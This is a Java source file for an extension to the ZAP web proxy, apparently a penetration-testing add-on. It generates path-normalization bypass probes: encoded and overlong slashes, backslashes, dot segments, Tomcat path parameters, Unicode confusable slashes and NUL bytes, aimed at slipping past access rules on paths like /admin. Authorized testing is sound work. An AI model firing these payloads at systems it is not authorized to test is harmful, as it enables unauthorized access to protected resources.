package org.zaproxy.zap.extension.hacktor.technique;

import java.util.List;
import java.util.function.BiConsumer;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;

/**
 * Compact path-normalization probes ported from unKover and extended with
 * rare / novel variants that exercise the differential between how front-end
 * routing components parse the request-target and how back-end frameworks
 * normalize it.
 *
 * <p>Sub-techniques:
 * <ul>
 *   <li><b>Classic</b> — unKover's PATH_VARIANTS ({@code /.}, {@code /./},
 *       {@code //}, {@code /%2f}, {@code /%20}, {@code /%09},
 *       {@code /..;/}).</li>
 *   <li><b>Rare</b> — encoded slash variants
 *       ({@code /%2F}, {@code /%2f%2f}, {@code /%c0%af}),
 *       backslash variants on Unix stacks ({@code /\/}, {@code /\},
 *       {@code /%5c}), and dot-segment inversions
 *       ({@code /.//}, {@code /./..}, {@code /..%2e/}).</li>
 *   <li><b>Novel</b> — null-byte suffixed prefixes ({@code /%00}),
 *       mid-path dot insertion that survives a single normalization pass
 *       ({@code /./adm/in}), trailing-dot variants
 *       ({@code /admin./}, {@code /admin./..}), Tomcat path-param
 *       prefixes ({@code /;/admin}), matrix-param injection
 *       ({@code /;jsessionid=x/admin}), and Unicode normalization forms
 *       ({@code /\uFF0Fadmin} = {@code /\uFF0Fadmin} fullwidth slash).</li>
 * </ul>
 */
public class PathNormalizationTechniqueBuilder extends AbstractTechniqueBuilder {

    @Override public String getFamily() { return "Path Norm"; }

    @Override public int getOrder() { return 63; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {

        String pathBody = ctx.baseClean.startsWith("/")
            ? ctx.baseClean.substring(1)
            : ctx.baseClean;

        // ── Classic — unKover PATH_VARIANTS verbatim ─────────────────────
        String[] classic = {"/.", "/./", "//", "/%2f", "/%20", "/%09", "/..;/"};
        for (String v : classic) {
            addVariant(techs, v, pathBody, "classic");
        }

        // ── Rare — encoded-slash variants (case + double-encoding) ───────
        String[] rareEncoded = {
            "/%2F",      // uppercase hex
            "/%2f%2f",   // double slash encoded
            "/%252f",    // double-encoded slash
            "/%c0%af",   // overlong UTF-8 slash
            "/%c0%2f",   // mixed overlong
            "/%2f%c0%af" // encoded + overlong
        };
        for (String v : rareEncoded) {
            addVariant(techs, v, pathBody, "rare-encoded");
        }

        // ── Rare — backslash variants on Unix stacks ────────────────────
        String[] rareBackslash = {
            "/\\",      // forward + backslash
            "\\/",      // backslash + forward
            "/%5c",     // encoded backslash
            "/%5C",     // uppercase-hex backslash
            "/%255c",   // double-encoded backslash
            "/\\\\"     // double backslash
        };
        for (String v : rareBackslash) {
            markRawAdd(techs, new Technique(getFamily(),
                "PathNormRare:" + v.replace("/", "S").replace("\\", "BS").replace("%", "P"),
                "Path-norm rare backslash variant: " + v,
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, v + pathBody); return c; }));
        }

        // ── Rare — dot-segment inversions / chain ───────────────────────
        String[] rareDotSeg = {
            "/./",      // repeated dot-segments
            "/../",     // explicit dot-dot slash
            "/./..",    // forward dot + dot-dot
            "/../.",    // dot-dot + dot
            "/././",    // repeated dot-slash
            "/.%2e/",   // dot then encoded dot
            "/..%2e/"   // dot-dot then encoded dot
        };
        for (String v : rareDotSeg) {
            addVariant(techs, v, pathBody, "rare-dot");
        }

        // ── Rare — whitespace / control characters after leading slash ─
        String[] rareCtrl = {
            "/\u0000",      // NUL byte
            "/\u200B",      // zero-width space
            "/\u200C",      // zero-width non-joiner
            "/\u200D",      // zero-width joiner
            "/\uFEFF",      // BOM / zero-width no-break space
            "/\t",      // raw tab
            "/\n"       // raw newline
        };
        for (String v : rareCtrl) {
            final String variant = v;
            markRawAdd(techs, new Technique(getFamily(),
                "PathNormRareCtrl:" + v.replace("\u0000", "_NUL").replace("\t", "_TAB")
                    .replace("\n", "_LF").replace("\u200B", "_ZWSP").replace("\u200C", "_ZWNJ")
                    .replace("\u200D", "_ZWJ").replace("\uFEFF", "_BOM"),
                "Path-norm rare control char: " + v.codePoints().mapToObj(cp -> "U+" + Integer.toHexString(cp).toUpperCase()).reduce((a, b) -> a + "," + b).orElse(""),
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, variant + pathBody); return c; }));
        }

        // ── Novel — Tomcat path-parameter prefixes ──────────────────────
        // /;param=value/path — Tomcat strips the path-param segment before
        // routing, leaving the un-stripped path to reach the dispatcher.
        String[] tomcatSemi = {
            "/;jsessionid=x",
            "/;a=b",
            "/;",
            "/;foo=/../../",
            "/;jsessionid=x/admin"
        };
        for (String v : tomcatSemi) {
            addVariant(techs, v, pathBody, "novel-tomcat");
        }

        // ── Novel — mid-path dot insertion ──────────────────────────────
        // Injecting /. within a segment can defeat string-equality checks
        // that compare a normalized path against a denylist prefix.
        if (pathBody.length() > 2) {
            String[] midDot = {
                "/.",
                "/./" + pathBody.substring(0, 1),
                "/" + pathBody.substring(0, 1) + "/.",
                "/" + pathBody.substring(0, pathBody.length() / 2) + "/."
            };
            for (String v : midDot) {
                final String variant = v + pathBody;
                techs.add(new Technique(getFamily(),
                    "PathNormMidDot",
                    "Path-norm mid-path dot insertion: " + variant,
                    base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, variant); return c; }));
            }
        }

        // ── Novel — trailing-dot / path-trailing-slash variants ─────────
        // Some IIS handlers strip trailing dots (Windows 8.3); trailing
        // slashes route to index handlers that may bypass per-file rules.
        String[] novelTrailing = {
            "/.",       // bare trailing dot
            "/./",      // dot-slash suffix
            "/...",     // triple dot
            "/.  ",     // dot + double-space
            "/.  \t"   // dot + whitespace mix
        };
        for (String v : novelTrailing) {
            final String variant = v;
            markRawAdd(techs, new Technique(getFamily(),
                "PathNormTrailingDot",
                "Path-norm trailing-dot variant: " + v.replace("\t", "\\t").replace(" ", "_S"),
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, variant + pathBody); return c; }));
        }

        // ── Novel — Unicode-normalization-confusable slashes ────────────
        // Fullwidth solidus U+FF0F and division slash U+2215 are byte-different
        // from ASCII / but NFKC-fold to it on Unicode-aware stacks.
        String unicodeSlash = "/\uFF0F"; // leading ASCII / + fullwidth slash
        markRawAdd(techs, new Technique(getFamily(),
            "PathNormUnicodeSlash",
            "Path-norm with Unicode-confusable slash (fullwidth)",
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, unicodeSlash + pathBody); return c; }));

        String divisionSlash = "/\u2215";
        markRawAdd(techs, new Technique(getFamily(),
            "PathNormUnicodeDiv",
            "Path-norm with Unicode division slash U+2215",
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, divisionSlash + pathBody); return c; }));

        // ── Novel — null-byte suffixed prefix ───────────────────────────
        // PHP < 5.3.4 and some C-based routers truncate at the first NUL.
        markRawAdd(techs, new Technique(getFamily(),
            "PathNormNul",
            "Path-norm with leading NUL byte (truncation bypass)",
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, "/\u0000" + pathBody); return c; }));

        // ── Novel — encoded NUL byte (raw-wire) ─────────────────────────
        techs.add(new Technique(getFamily(),
            "PathNormPctNul",
            "Path-norm with percent-encoded NUL byte",
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, "/%00" + pathBody); return c; }));
    }

    private void addVariant(List<Technique> techs, String variant, String pathBody, String kind) {
        final String v = variant;
        techs.add(new Technique(getFamily(),
            "PathNorm[" + kind + "]:" + variant.replace("/", "S").replace("%", "P").replace(";", "SC"),
            "[" + kind + "] Path-norm variant: " + variant,
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, v + pathBody); return c; }));
    }
}